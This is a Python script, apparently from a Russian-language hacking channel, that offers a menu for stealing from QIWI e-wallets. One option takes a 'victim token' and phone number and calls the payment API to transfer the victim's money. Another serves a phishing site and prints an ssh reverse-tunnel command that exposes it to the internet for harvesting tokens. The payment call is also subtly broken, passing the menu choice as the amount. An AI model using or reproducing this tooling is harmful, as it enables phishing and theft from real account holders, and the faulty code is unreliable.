import os
import subprocess
from SimpleQIWI import * 
from colorama import Fore, Back, Style

def cls():
    os.system('cls' if os.name=='nt' else 'clear')

cls()
print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
print("")
print(" /\___ \                      /\ \                   ")    
print(" \/__/\ \      __       ___   \ \ \/'\       __    _ __   ")
print("    _\ \ \  /'__`\    /'___\   \ \ , <     /'__`\ /\`'__\  ")
print("   /\ \_\ \/\ \L\.\_ /\ \__/    \ \ \\`\  /\  __/ \ \ \/  ")
print("   \ \____/\ \__/.\_\\ \____\     \ \_\ \_\\ \____\ \ \_\  ")
print("    \/___/  \/__/\/_/ \/____/     \/_/\/_/ \/____/  \/_/   ")
                                      
print(" ")
print(Fore.CYAN + "  by @wannadeauth | @wannadeauth_chat (telegram)")
print("-------------------------------------------------")
print(Fore.BLACK + " ")
print(" ")
print(Fore.YELLOW + " [1] QIWI API (web version) | веб версия")
print(" ")
                   
print(Fore.MAGENTA + " [2] QIWI API (terminal) | в терминале")
print(" ")
print(Fore.BLUE + " [3] Fishing fake site | фишинг ")
print(" ")
print(" ")

a = input(Fore.GREEN + " Change parametr | Выберите параметр: ")


if a == "1":
    cls()
    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
    print("")
    print("  _                                               ")
    print(" /\___ \                     /\ \                   ")    
    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
    print(" ")
    print(Fore.CYAN + "  by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------")
                                          
    print(" ")

    print(" ")
    print(Fore.GREEN + "  Starting Server... ")
    os.chdir("api")
    try:
        os.system("php -S localhost:8080")
    except:
        print(Fore.RED + "Download php, or reboot your device | Установите php или перезагрузите устройство")
        print(Fore.WHITE + "apt install php")

elif a == "2":
    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
    print("")
    print(" /\___ \                     /\ \                   ")    
    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
    print(" ")
    print(Fore.CYAN + "  by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------")
    print(" ")
             
    token = input(Fore.YELLOW + ' Enter victim token: ')
    print(" ")
    phone = input(' Enter victim phone: ')
    print(" ")
    summa = input(" Money | Сумма: ")
    print(" ")
    com = input(" Comments on the translation | Комментарий к переводу: ")
    api = QApi(token=token, phone=phone)
    print(" ")
    print(Fore.WHITE + 'Balance Founded | Найдено!')
            
    api.pay(account=" Where to transfer money? | Куда перевести деньги: ", amount= a, comment=com)
    print(api.balance)

elif a == "3":
    cls()
    print(Fore.GREEN + " /\  __\    /\__  _\    /\ \  __/\ \   /\__  _\   ")
    print(" \ \ \/\ \   \/_/\ \/    \ \ \/\ \ \ \  \/_/\ \/    ")
    print("  \ \ \ \ \     \ \ \     \ \ \ \ \ \ \    \ \ \   ")
    print("   \ \ \ \ \     \_\ \__   \ \ \_/ \_\ \    \_\ \__  ")
    print("    \ \___\_\    /\_____\   \ \___x___/    /\_____\  ")
    print("     \/__//_/    \/_____/    '\/__//__/     \/_____/ ")
    print("")
    print("  _                                               ")
    print(" /\___ \                     /\ \                   ")    
    print(" \/__/\ \     __       ___   \ \ \/'\       __    _ __   ")
    print("    _\ \ \  /'__`\    /'___\  \ \ , <     /'__`\ /\`'__\  ")
    print("   /\ \_\ \/\ \L\.\_ /\ \__/   \ \ \\`\  /\  __/ \ \ \/  ")
    print("   \ \____/\ \__/.\_\\ \____\    \ \_\ \_\\ \____\ \ \_\  ")
    print("    \/___/  \/__/\/_/ \/____/    \/_/\/_/ \/____/  \/_/   ")
    print(" ")
    print(Fore.CYAN + "  by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------")
    print(" ")
                                           
    print(" ")
    print(Fore.GREEN + "  Starting Server... ")
    os.chdir("fish")
    print(os.listdir())
    try:
              
        print(Fore.MAGENTA + "   Open second session and write command: ")
        print(" ")
        print(Fore.WHITE + "  ssh -R 80:localhost:8080 qiwi-api-token-form-id@ssh.localhost.run")
        print(" ")
        print(Fore.MAGENTA + "   Откройте вторую сессию и напишите команду вверху")
        os.system("php -S localhost:8080")
    except:
        print(Fore.RED + "Download php, or reboot your device | Установите php или перезагрузите устройство")
        print(Fore.WHITE + "apt install php")
else:
	print(Fore.RED + " Выбран неверный параметр | No found such parametr")


        
